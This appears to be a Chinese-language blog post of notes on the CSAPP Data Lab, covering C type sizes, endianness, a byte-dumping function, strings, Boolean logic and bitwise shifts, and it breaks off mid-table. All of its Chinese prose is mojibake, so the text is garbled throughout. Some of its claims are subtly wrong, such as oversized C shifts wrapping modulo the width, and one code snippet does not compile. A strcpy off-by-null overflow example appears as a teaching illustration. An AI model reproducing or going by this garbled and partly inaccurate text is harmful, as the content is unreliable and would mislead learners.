å­—èŠ‚ï¼Œé‚£å°±æ˜¯ç†ŸçŸ¥çš„ <code>4GB</code> äº†ã€‚</p><p><code>C</code> è¯­è¨€ä¸­  <code>sizeof()</code> ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡æ‰€å çš„å­—èŠ‚æ•°ï¼Œæˆ‘ä»¬å¯¹æ¯”è¾“å‡ºä¸‹ <code>32</code> ä½æœºå­å’Œ <code>64</code> ä½æœºå­çš„å„ä¸ªåŸºæœ¬æ•°æ®ç±»å‹æ‰€å çš„å­—èŠ‚æ•°ã€‚æˆ‘ä»¬ä¸å¿…æ‰¾ä¸¤ä¸ªæœºå­ï¼Œåªéœ€è¦åœ¨ <code>64</code> ä½çš„æœºå­ä¸Šåˆ†åˆ«ç¼–è¯‘ <code>32</code> ä½å’Œ <code>64</code> ä½çš„ç¨‹åºå³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;short:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">short</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;int:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;long:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char *:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;float:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">float</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;double:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>32 </code>ä½çš„ç»“æœï¼š</p><p><img src="/2022/06/03/CSAPP_Datalab/1.png" alt="1"></p><p><code>64</code> ä½çš„ç»“æœï¼š</p><p><img src="/2022/06/03/CSAPP_Datalab/2.png" alt="2">    </p><p>æˆ‘ä»¬æ€»ç»“å‡ºå¦‚ä¸‹è¡¨æ ¼</p><table><thead><tr><th>Cå£°æ˜</th><th>32ä½å­—èŠ‚æ•°</th><th>64ä½å­—èŠ‚æ•°</th></tr></thead><tbody><tr><td>char</td><td>1</td><td>1</td></tr><tr><td>short</td><td>2</td><td>2</td></tr><tr><td>int</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>4</td></tr><tr><td>char *</td><td>4</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td></tr></tbody></table><p>å…¶å®æœ‰äº›æ—¶å€™ï¼Œ <code>long</code> çš„å­—èŠ‚æ•°ä¹Ÿä¼šéšæœºå™¨å­—é•¿æœ‰æ‰€å˜åŒ–çš„ï¼Œåªæ˜¯å¥½åƒæŸä¸ªç‰ˆæœ¬åŒºåˆ†äº† <code>64</code> ä½æ•´æ•°å°±å« <code>long long</code> è€Œ <code>long</code> åœ°ä½ä¸ <code>int</code> ä¸€è‡´äº†ã€‚ä½†æ˜¯é™¤äº†è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥å‘ç°åªæœ‰æŒ‡é’ˆç±»å‹çš„æ•°æ®ä¼šéšç€æœºå™¨å­—é•¿å‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¹Ÿå¦‚æˆ‘ä»¬æ‰€è¯´ï¼Œæœºå™¨å­—é•¿å†³å®šäº†æŒ‡é’ˆå°±å¤šå°‘ä½ï¼Œå†³å®šäº†æœ‰å¤šå°‘ä¸ªåœ°å€ï¼Œèƒ½ç”¨å¤šå°‘å†…å­˜ï¼Œå¤šå‡ºçš„å†…å­˜æœºå™¨å°±æ— æ³•åšåŒºåˆ†äº†ã€‚</p><h3 id="å¯»å€å’Œå­—èŠ‚é¡ºåº"><a href="#å¯»å€å’Œå­—èŠ‚é¡ºåº" class="headerlink" title="å¯»å€å’Œå­—èŠ‚é¡ºåº"></a>å¯»å€å’Œå­—èŠ‚é¡ºåº</h3><p>å¯¹äºå¤šå­—èŠ‚çš„æ•°æ®ç±»å‹æˆ‘ä»¬å¿…é¡»ç¡®å®šä¸¤ç‚¹ï¼š</p><ol><li>è¿™ä¸ªå¯¹è±¡åœ°å€åœ¨å“ªé‡Œ</li><li>è¿™ä¸ªå¯¹è±¡ä¸­çš„å­—èŠ‚æŒ‰ä»€ä¹ˆé¡ºåºæ’åˆ—</li></ol><p>æ¯”å¦‚ä¸€ä¸ª <code>int</code> å®ƒæœ‰å››ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘å®šä¹‰ <code>int a=0x12345678</code>ã€‚é¦–å…ˆå®ƒä¸€å®šæ˜¯è¿ç»­æ’åˆ—çš„ï¼Œå› æ­¤æˆ‘ä»¬ç¡®å®šä¸€ä¸ª <code>int</code> çš„åœ°å€åªéœ€è¦ç¡®å®šå®ƒçš„æœ€é«˜å­—èŠ‚çš„ä½ç½®å³å¯ç¡®å®šæ•´ä¸ª <code>int</code> çš„ä½ç½®ã€‚å‡å¦‚ <code>int</code> çš„åœ°å€æ˜¯åœ¨ <code>0x100</code> çš„ï¼Œé‚£ä¹ˆå®ƒåº”è¯¥æ€ä¹ˆæ’åˆ—è¿™äº›å­—èŠ‚å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æœ€åˆå¯èƒ½æŒ‰ç…§æƒ¯æ€§ï¼Œè®¤ä¸ºå®ƒæ˜¯æŒ‰ç…§å¦‚ä¸‹æ–¹å¼å­˜å‚¨çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å­—èŠ‚ï¼š12  34  56  78</span><br><span class="line">åœ°å€ï¼š100 101 102 103</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¹Ÿå¾ˆç¬¦åˆæˆ‘ä»¬çš„ä¹¦å†™è§„åˆ™ï¼Œä½†æ˜¯å®æ—¶å´æ°æ°ç›¸åï¼Œåœ¨ç°åœ¨å¤§éƒ¨åˆ†çš„æœºå™¨ä¸­ï¼Œå®ƒæ˜¯åç€å­˜å‚¨çš„ã€‚ä¹Ÿå°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å­—èŠ‚ï¼š78  56  34  12</span><br><span class="line">åœ°å€ï¼š100 101 102 103</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ç§å­˜å‚¨æ–¹å¼æˆ‘ä»¬åˆ†åˆ«å«å¤§ç«¯åºå’Œå°ç«¯åºã€‚</p><ul><li><p>å¤§ç«¯åºï¼šæœ€é«˜æœ‰æ•ˆå­—èŠ‚åœ¨ä½åœ°å€</p></li><li><p>å°ç«¯åºï¼šæœ€é«˜æœ‰æ•ˆå­—èŠ‚åœ¨é«˜åœ°å€</p></li></ul><p>åœ¨æˆ‘ä»¬ä¹¦å†™æ±‡ç¼–è¯­è¨€çš„æ—¶å€™ï¼Œè¦å†™ä¸€ä¸ªå€¼é€šå¸¸ä¹Ÿæ˜¯ä»¥å°ç«¯åºçš„æ–¹å¼ä¹¦å†™çš„ã€‚</p><p>æ¯”å¦‚æˆ‘ç»™ <code>eax</code> å¯„å­˜å™¨åŠ ä¸Š <code>0x12345678</code> ä½ ä¼šå‘ç°å®ƒçš„å­—èŠ‚ç æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x12345678,%eax </span><br><span class="line">b8 78 56 34 12</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡å®šä¹‰ä»¥ä¸‹çš„å‡½æ•°ä»¥åå…­è¿›åˆ¶æ¥é€ä¸ªæ˜¾ç¤ºå†…å­˜ä¸­çš„å­—èŠ‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>start</code> å‚æ•°ä¸ºè¯¥å¯¹è±¡çš„èµ·å§‹åœ°å€ï¼Œ<code>len</code> å‚æ•°ä¸ºæ˜¾ç¤ºçš„å­—èŠ‚æ•°ï¼Œå¯ä»¥ä»»æ„å®šä¹‰å˜é‡è°ƒç”¨è¿™ä¸ªå‡½æ•°æ¥æŸ¥çœ‹è¿™ä¸ªå¯¹è±¡åœ¨å†…å­˜ä¸­çš„æ’å¸ƒï¼Œç†è§£æµ®ç‚¹æ•°çš„æ—¶å€™è¿™ä¸ªå‡½æ•°éå¸¸æœ‰ç”¨ã€‚</p><p>æ¥æŸ¥çœ‹ä¸‹é¢çš„ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0x3039</span>;</span><br><span class="line">    show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">    <span class="keyword">float</span> y=x;</span><br><span class="line">    show_bytes(&amp;y,<span class="keyword">sizeof</span>(y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æµ®ç‚¹æ•°çš„è¾“å‡ºåœ¨æ•´æ•°å½¢æ€ä¸‹ä¸º <code>0x4640E400</code>ã€‚ä¸æ•´æ•°çš„å­˜å‚¨æœ‰ç€æˆªç„¶ä¸åŒçš„ç»“æœï¼Œä½†æ˜¯æˆ‘ä»¬å¯¹è¿™ä¸ªç»“æœçš„äºŒè¿›åˆ¶é€‚å½“ç§»ä½å°±ä¼šå‘ç°å®ƒä»¬æœ‰13ä¸ªç›¸åŒ¹é…çš„ä½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  0   0   0   0   3   0   3   9</span><br><span class="line">0000000000000000001000000111001</span><br><span class="line">            4   6   4   0   E   4   0   0</span><br><span class="line">         01000110010000001110010000000000</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°13ä¸ªä½åˆšå¥½å°±æ˜¯ <code>int</code> å½¢å¼ä¸‹çš„ä½ <code>13</code> ä½ï¼Œè¿™å¹¶ä¸æ˜¯å·§åˆï¼Œå¤§å®¶å¯ä»¥è¯•è¯•çœ‹å…¶å®ƒæ•°ï¼Œå¹¶ä¸”å¯ä»¥çœ‹çœ‹å®ƒæœ€å¤šèƒ½åŒ¹é…å¤šå°‘ä½çš„æ•´æ•°ï¼Œä½†æ˜¯è¦æ³¨æ„ç»“è®ºéœ€è¦æœ‰ä¸€èˆ¬æ€§ï¼Œç‰¹æ®Šçš„æ•°å­—ç¬¦åˆå¹¶ä¸èƒ½å¾—å‡ºä»€ä¹ˆç»“è®ºï¼Œåªèƒ½è¯´æ˜¯ç‰¹æ€§ã€‚</p><h3 id="è¡¨ç¤ºå­—ç¬¦ä¸²"><a href="#è¡¨ç¤ºå­—ç¬¦ä¸²" class="headerlink" title="è¡¨ç¤ºå­—ç¬¦ä¸²"></a>è¡¨ç¤ºå­—ç¬¦ä¸²</h3><p>å­—ç¬¦ä¸²çš„å®šä¹‰å°±æ˜¯ä¸€ä¸ªä»¥ <code>null</code> å­—ç¬¦ç»“å°¾çš„å­—ç¬¦æ•°ç»„ï¼Œå¦‚æœå°†å­—ç¬¦ä¸²çœ‹æˆä¸€ä¸ªæ•°æ®ç±»å‹çš„è¯ï¼Œé‚£ä¹ˆå®ƒæ˜¯ä»¥å¤§ç«¯å½¢å¼å­˜å‚¨çš„ï¼Œä½†æ˜¯å…¶å®å®é™…ä¸Šåº”è¯¥è¯´æ˜¯æ•°ç»„æ˜¯å¤§ç«¯å­˜å‚¨çš„ã€‚æˆ‘ä»¬åœ¨ä¹¦å†™çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¸‹æ ‡ <code>0 </code>æ˜¯æœ€å°çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹ æƒ¯æŠŠå®ƒç§°ä¸ºé«˜ä½ï¼Œé«˜ä½åœ¨ä½åœ°å€ä¾¿æ˜¯å¤§ç«¯åºã€‚æ¯”å¦‚ <code>char s[]=&quot;1234&quot;;</code> é‚£ä¹ˆ <code>s[0]=&#39;1&#39;,s[1]=&#39;2&#39;,s[2]=&#39;3&#39;,s[3]=4,s[4]=NULL</code>ã€‚è¯·æ³¨æ„æœ«å°¾çš„ç©ºå­—èŠ‚ä¹Ÿä¼šåŒ…æ‹¬åœ¨å­—ç¬¦ä¸²é‡Œé¢ï¼Œä½†æ˜¯æˆ‘ä»¬ç®—é•¿åº¦ä¸ä¼šç®—ä¸Šè¿™ä¸ªå­—èŠ‚ã€‚åœ¨ <code>gcc</code> ç¼–è¯‘å™¨ä¸­ï¼Œæˆ‘ä»¬ç¼–è¯‘å¦‚ä¸‹çš„ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> s[]=<span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(buf,s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨ä¼šå‘å‡ºå¯èƒ½å­˜åœ¨æº¢å‡ºçš„è­¦å‘Šï¼Œå› ä¸ºåœ¨æ‹·è´çš„æ—¶å€™ä¼šå¤šæºå¸¦ä¸€ä¸ª <code>0</code> å­—èŠ‚è¿‡æ¥ï¼Œè¿™åœ¨åé¢å †åˆ©ç”¨ä¸­ä¹Ÿæ˜¯å¾ˆå¸¸è§çš„ <code>off by null</code> çš„æ‰‹æ®µã€‚</p><p>å†æ¯”å¦‚æˆ‘ä»¬ç”¨è¿™æ ·çš„æ–¹å¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> s[]=<span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="keyword">sizeof</span>(s));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç°è¿™ä¸ª <code>char</code> æ•°ç»„å ç”¨äº† <code>17</code> ä¸ªå­—èŠ‚çš„ç©ºé—´ã€‚</p><h3 id="å¸ƒå°”ä»£æ•°ç®€ä»‹"><a href="#å¸ƒå°”ä»£æ•°ç®€ä»‹" class="headerlink" title="å¸ƒå°”ä»£æ•°ç®€ä»‹"></a>å¸ƒå°”ä»£æ•°ç®€ä»‹</h3><p>å¸ƒå°”ä»£æ•°æ˜¯ä¸€ä¸ªå»ºç«‹åœ¨äºŒå…ƒé›†åˆé›†åˆ <code>G=&#123;0,1&#125;</code> ä¸Šçš„å®šä¹‰ã€‚</p><h4 id="é"><a href="#é" class="headerlink" title="é"></a>é</h4><blockquote><p>é0å³ä¸º1ï¼Œéé0å³ä¸º0ã€‚</p></blockquote><h4 id="ä¸"><a href="#ä¸" class="headerlink" title="ä¸"></a>ä¸</h4><blockquote><p>å…¨1ä¸º1ï¼Œä¸å…¨1ä¸º0</p></blockquote><h4 id="æˆ–"><a href="#æˆ–" class="headerlink" title="æˆ–"></a>æˆ–</h4><blockquote><p>å…¨0ä¸º0ï¼Œä¸å…¨0ä¸º1</p></blockquote><h4 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h4><blockquote><p>ç›¸åŒä¸º0ï¼Œä¸åŒä¸º1</p></blockquote><hr><h4 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h4><ol><li>é0ä¸º1ï¼Œé1ä¸º0</li><li>1ä¸1ä¸º1ï¼Œ1ä¸0ä¸º0ï¼Œ0ä¸1ä¸º0ï¼Œ0ä¸0ä¸º0</li><li>1æˆ–1ä¸º1ï¼Œ1æˆ–0ä¸º1ï¼Œ0æˆ–1ä¸º1ï¼Œ0æˆ–0ä¸º0</li><li>1å¼‚æˆ–1ä¸º0ï¼Œ1å¼‚æˆ–0ä¸º1ï¼Œ0å¼‚æˆ–1ä¸º1ï¼Œ0å¼‚æˆ–0ä¸º0</li></ol><p>åœ¨Cè¯­è¨€ä¸­ä¹Ÿæœ‰ä¸€ä¸ªç±»å‹æ˜¯ <code>bool</code>ï¼Œå®ƒä»¬æœ‰ç‰¹æ®Šçš„è¿ç®—ç¬¦ï¼š</p><ul><li>ä¸ï¼š&amp;&amp;</li><li>æˆ–ï¼š||</li><li>éï¼š!</li></ul><p>ä¸ä¸€æ ·çš„æ˜¯ï¼Œåœ¨è¿›è¡Œè¿™äº›è¿ç®—çš„æ—¶å€™ï¼Œç»Ÿç»Ÿä¼šæŠŠå‚ä¸è¿ç®—çš„å€¼è½¬ä¸º <code>bool</code> ç±»å‹ï¼Œ<code>0</code> å°±æ˜¯ <code>0</code>ï¼Œä¸æ˜¯ <code>0</code> ä¸€å¾‹éƒ½æ˜¯ <code>1</code></p><h3 id="Cè¯­è¨€å½“ä¸­çš„ä½çº§è¿ç®—"><a href="#Cè¯­è¨€å½“ä¸­çš„ä½çº§è¿ç®—" class="headerlink" title="Cè¯­è¨€å½“ä¸­çš„ä½çº§è¿ç®—"></a>Cè¯­è¨€å½“ä¸­çš„ä½çº§è¿ç®—</h3><h4 id="ä½é€»è¾‘è¿ç®—"><a href="#ä½é€»è¾‘è¿ç®—" class="headerlink" title="ä½é€»è¾‘è¿ç®—"></a>ä½é€»è¾‘è¿ç®—</h4><p>æˆ‘ä»¬å¹³æ—¶Cè¯­è¨€çš„ä½è¿ç®—ä¼šæ‰©å±•åˆ°æ¯ä¸€ä½ï¼Œä½ä¹‹é—´ç‹¬ç«‹åœ°è¿ç®—ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªæ•´æ•°(int)è§†ä¸º32ç»´çš„å‘é‡ï¼Œæ¯ä¸ªç»´åº¦ä¸º0æˆ–è€…1ï¼Œå¯¹æ•´æ•°è¿›è¡Œä½é€»è¾‘è¿ç®—ç›¸å½“äºæ¯ä¸€ä½åˆ†åˆ«åšé€»è¾‘è¿ç®—ï¼Œæ¯ä¸€ä½ç»“æœä¸ºæ–°å‘é‡å¯¹åº”ä½çš„ç»“æœã€‚åœ¨ <code>C</code> è¯­è¨€ä¸­ï¼Œä»¥ä¸Šé€»è¾‘è¿ç®—å¯¹åº”çš„ç¬¦å·åˆ†åˆ«ä¸ºï¼š</p><ul><li>éï¼š~</li><li>ä¸ï¼š&amp;</li><li>æˆ–ï¼š|</li><li>å¼‚æˆ–ï¼š^</li></ul><p>æˆ‘ä»¬å¯ä»¥åœ¨åªæ‹¥æœ‰éå’Œå…¶å®ƒä»»æ„ä¸€ä¸ªåŒç›®è¿ç®—æ¥å®ç°æ‰€æœ‰çš„ä½é€»è¾‘è¿ç®—ã€‚</p><p>æ¯”å¦‚æˆ‘ä¸ç”¨å¼‚æˆ–å®ç°å¼‚æˆ–çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆå°±æ˜¯ï¼š</p><p>ä¸€ä¸ªä¸º <code>1</code>ï¼Œä¸€ä¸ªä¸º <code>0</code> é‚£ä¹ˆä¸ºæˆ–è€…ä¸€ä¸ªä¸º <code>0</code>ï¼Œä¸€ä¸ªä¸º <code>1</code> çš„æƒ…å†µéƒ½æ˜¯ <code>1</code>ï¼Œå…¶ä½™éƒ½æ˜¯ <code>0</code>ã€‚æˆ‘ä»¬çŸ¥é“ä¸çš„ç‰¹æ€§å°±æ˜¯åªæœ‰å…¨ <code>1</code> çš„æ—¶å€™ä¸º <code>0</code>ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘å…¶ä¸­ä¸€ä¸ªå–éäº†ï¼Œå†ä¸è¿˜æ˜¯1çš„è¯å°±è¯´æ˜ä¸€ä¸ªä¸º <code>1</code> ä¸€ä¸ªä¸º <code>0</code> äº†ï¼Œä¸¤è¾¹éƒ½éä¸€ä¸‹ï¼Œæœ€åæŠŠç¬¦åˆæ¡ä»¶çš„ä½æˆ–ä¸€ä¸‹å°±èƒ½å¾—åˆ°å¼‚æˆ–çš„ç»“æœäº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xor</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (~x&amp;y)|(x&amp;~y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¸å’Œæˆ–ï¼ŒæŠŠéè¿ç”¨åˆ°ä½äº†å®ƒä»¬ä¸¤ä¸ªä¹Ÿèƒ½è¿ç”¨è‡ªå¦‚è‡ªç”±è½¬æ¢ã€‚</p><p>æ¯”å¦‚æˆ‘ç”¨ä¸å’Œéå®ç°æˆ–ï¼Œé¦–å…ˆæˆ‘å¯¹ä¸¤ä¸ªå…ƒç´ éƒ½éä¸€ä¸‹ç„¶åä¸èµ·æ¥ï¼Œæ˜¯ä¸æ˜¯å°±å˜æˆäº†ï¼š</p><p>å…¨ <code>0</code> ä¸º <code>1</code>ï¼Œå…¶ä½™ä¸º <code>0</code> äº†ï¼Œè¿™å’Œæˆ–çš„å…¨ <code>0</code> ä¸º <code>0</code>ï¼Œå…¶ä½™ä¸º <code>1</code> å·®äº†ä»€ä¹ˆï¼Ÿå¾ˆæ˜¾ç„¶ç»“æœåäº†ï¼Œé‚£ä¹ˆæˆ‘å°±å¯¹ç»“æœå†éä¸€ä¸‹ï¼Œæœ€åå°±å˜æˆäº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">or</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(~x&amp;~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ–å’Œéå®ç°ä¸è¿ç®—åŒç†ã€‚</p><h4 id="ç§»ä½è¿ç®—"><a href="#ç§»ä½è¿ç®—" class="headerlink" title="ç§»ä½è¿ç®—"></a>ç§»ä½è¿ç®—</h4><p>è¿™é‡Œåˆ†é€»è¾‘ç§»ä½å’Œç®—æ•°ç§»ä½ï¼Œå…¶å®å·®ä¸å¤šï¼Œåªä¸è¿‡é€»è¾‘ç§»ä½é€‚ç”¨æ— ç¬¦å·æ•´æ•°ï¼Œç®—æ•°ç§»ä½é€‚ç”¨æœ‰ç¬¦å·æ•´æ•°ã€‚</p><p>åˆ†å·¦ç§»å’Œå³ç§»ï¼Œåˆ†åˆ«ç”¨ç¬¦å· <code>&lt;&lt;</code> å’Œ <code>&gt;&gt;</code> æ¥è¡¨ç¤ºï¼Œå‡è®¾æ•´æ•°ä¸€å…± <code>w</code> ä½ï¼Œå³ç§» <code>n</code> ä½è¡¨ç¤ºä¸¢å¼ƒä½ <code>n</code> ä½ï¼ŒåŸæ¥çš„é«˜<code>w-n</code> ä½å˜ä¸ºä½ <code>w-n</code> ä½ï¼Œé«˜ <code>n</code> ä½å˜ä¸º0ã€‚å·¦ç§» <code>n</code> ä½è¡¨ç¤ºä¸¢å¼ƒé«˜ <code>n</code> ä½ï¼ŒåŸæ¥çš„ä½ <code>w-n</code> ä½å˜ä¸ºé«˜ <code>w-n</code> ä½ï¼Œä½ <code>n</code> ä½å˜ä¸º0ã€‚</p><h5 id="é€»è¾‘ç§»ä½"><a href="#é€»è¾‘ç§»ä½" class="headerlink" title="é€»è¾‘ç§»ä½"></a>é€»è¾‘ç§»ä½</h5><p>å·¦ç§»å³ç§»å°±æ˜¯å­—é¢æ„æ€</p><h5 id="ç®—æ•°ç§»ä½"><a href="#ç®—æ•°ç§»ä½" class="headerlink" title="ç®—æ•°ç§»ä½"></a>ç®—æ•°ç§»ä½</h5><p>æ­£æ•°ä¸é€»è¾‘ç§»ä½ä¸€æ ·ï¼Œè´Ÿæ•°åˆ™ä¼šåœ¨å³ç§»çš„æ—¶å€™é«˜ä½æ·»1.</p><hr><p>å·¦ç§»xç›¸å½“äºå¯¹è¯¥æ•°ä¹˜ <code>2</code> çš„ <code>x</code> æ¬¡æ–¹ï¼Œå³ç§»ç›¸å½“äºå¯¹è¯¥æ•°é™¤ <code>2</code> çš„ <code>x</code> æ¬¡æ–¹å–æ•´ã€‚</p><p>å½“ç§»ä½çš„ä½æ•°å¤§äºç­‰äºè¯¥æ•´æ•°çš„æœ€å¤§ä½æ•°ï¼Œåˆ™ä¼šå–æ¨¡å†ç§»ä½ã€‚</p><h3 id="æ•´æ•°è¡¨ç¤º"><a href="#æ•´æ•°è¡¨ç¤º" class="headerlink" title="æ•´æ•°è¡¨ç¤º"></a>æ•´æ•°è¡¨ç¤º</h3><p>æ•´æ•°æˆ‘ä»¬ä¹‹å‰è®²è¿‡äº†å®ƒçš„å­—èŠ‚æ’å¸ƒè§„å¾‹ï¼Œä½†æ˜¯å¯¹äºè´Ÿæ•°è®¡ç®—æœºåˆå°†å¦‚ä½•å¤„ç†å‘¢ï¼Ÿ</p><h4 id="æ•´æ•°æ•°æ®ç±»å‹"><a href="#æ•´æ•°æ•°æ®ç±»å‹" class="headerlink" title="æ•´æ•°æ•°æ®ç±»å‹"></a>æ•´æ•°æ•°æ®ç±»å‹</h4><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€å¼ è¡¨æ ¼</p><table><thead><tr><th>Cå®šä¹‰</th><th>æœ€å°å€¼</th><th>æœ€å¤§å€¼</th></tr></thead><tbody><tr><td>char</td><td>-128</td><td>127</td></tr><tr><td>unsigned char</td><td>0</td><td>255</td></tr><tr><td>short</td><td>-32768</td><td>32767</td></tr><tr><td>unsigned 